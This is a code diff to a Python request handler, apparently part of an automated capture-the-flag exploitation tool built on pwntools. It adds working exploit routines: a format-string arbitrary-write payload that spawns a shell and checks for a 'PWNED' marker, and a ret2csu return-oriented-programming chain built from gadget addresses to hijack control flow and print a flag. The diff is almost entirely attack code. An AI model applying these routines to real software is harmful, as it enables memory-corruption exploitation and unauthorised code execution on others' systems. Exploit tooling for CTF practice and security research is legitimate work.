@@ -350,6 +350,88 @@ def _handle(request: dict) -> dict:
             return {"ok": True, "data": {"solved": False,
                                          "error": last_error or "payload_failed",
                                          "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
+        if op == "fmtstr_write_chain":
+            from pwn import fmtstr_payload
+
+            path = request["path"]
+            offset = int(request["offset"])
+            writes = {int(key): int(value) for key, value in request["writes"].items()}
+            follow = bytes.fromhex(request.get("follow", ""))
+            marker = str(request.get("marker") or "PWNED").encode()
+            started = time.perf_counter()
+            io = None
+            try:
+                import os as _os
+                io = process(path, cwd=_os.path.dirname(path))
+                payload = fmtstr_payload(offset, writes,
+                                         write_size=request.get("write_size", "short"))
+                io.sendline(payload)
+                time.sleep(0.3)
+                if follow:
+                    io.send(follow)
+                time.sleep(0.3)
+                io.send(b"echo PWNED; exit\n")
+                output = io.recvrepeat(1.5) or b""
+                return {"ok": True, "data": {
+                    "solved": marker in output, "payload_len": len(payload),
+                    "output": output[-200:].decode("utf-8", "replace"),
+                    "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
+            except Exception as error:  # noqa: BLE001
+                return {"ok": True, "data": {"solved": False,
+                                             "error": f"{type(error).__name__}:{error}"[:100]}}
+            finally:
+                if io is not None:
+                    try:
+                        io.close()
+                    except Exception:  # noqa: BLE001
+                        pass
+        if op == "csu_call":
+            from pwn import ROP, context, p64
+
+            elf = _elf(request["path"])
+            csu = _csu_gadgets(elf)
+            if csu is None:
+                return {"ok": True, "data": {"solved": False,
+                                             "error": "csu_gadget_missing"}}
+            context.arch = "amd64" if elf.bits == 64 else "i386"
+            context.bits = elf.bits
+            g1, g2, mapping = csu["g1"], csu["g2"], csu["mapping"]
+            offset = int(request["offset"])
+            pointer = int(request["pointer"])
+            rdi = int(request.get("rdi", 0))
+            rsi = int(request.get("rsi", 0))
+            rdx = int(request.get("rdx", 0))
+            after = int(request["after"])
+            marker = str(request.get("marker") or "flag").encode()
+            values = {"rbx": 0, "rbp": 1, "r12": pointer}
+            slots = {"rdx": rdx, "rsi": rsi, "edi": rdi & 0xFFFFFFFF}
+            for slot, register in mapping.items():
+                values[register.rstrip("d") if register.endswith("d") else register] = slots[slot]
+            payload = (b"A" * offset + p64(g1) + p64(values["rbx"])
+                       + p64(values["rbp"]) + p64(values["r12"])
+                       + p64(values["r13"]) + p64(values["r14"])
+                       + p64(values["r15"]) + p64(g2) + p64(0) * 7
+                       + p64(after))
+            started = time.perf_counter()
+            io = None
+            try:
+                io = process(elf.path, cwd=__import__("os").path.dirname(elf.path))
+                io.sendline(payload)
+                time.sleep(0.3)
+                output = io.recvrepeat(1.2) or b""
+                solved = marker in output
+                return {"ok": True, "data": {
+                    "solved": solved, "output": output[-200:].decode("utf-8", "replace"),
+                    "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
+            except Exception as error:  # noqa: BLE001
+                return {"ok": True, "data": {"solved": False,
+                                             "error": f"{type(error).__name__}:{error}"[:100]}}
+            finally:
+                if io is not None:
+                    try:
+                        io.close()
+                    except Exception:  # noqa: BLE001
+                        pass
         if op == "partial_overwrite":
             path = request["path"]
             offset = int(request["offset"])
@@ -493,8 +575,13 @@ def _handle(request: dict) -> dict:
             g1, g2, mapping = csu["g1"], csu["g2"], csu["mapping"]
 
             def csu_call(pointer, rdi, rsi, rdx, after):
-                return (p64(g1) + p64(0) + p64(1) + p64(pointer)
-                        + p64(rdx) + p64(rsi) + p64(rdi & 0xFFFFFFFF)
+                values = {"rbx": 0, "rbp": 1, "r12": pointer}
+                slots = {"rdx": rdx, "rsi": rsi, "edi": rdi & 0xFFFFFFFF}
+                for slot, register in mapping.items():
+                    values[register.rstrip("d") if register.endswith("d") else register] = slots[slot]
+                return (p64(g1) + p64(values["rbx"]) + p64(values["rbp"])
+                        + p64(values["r12"]) + p64(values["r13"])
+                        + p64(values["r14"]) + p64(values["r15"])
                         + p64(g2) + p64(0) * 7 + p64(after))
 
             offsets = [int(value) for value in request["offsets"]]
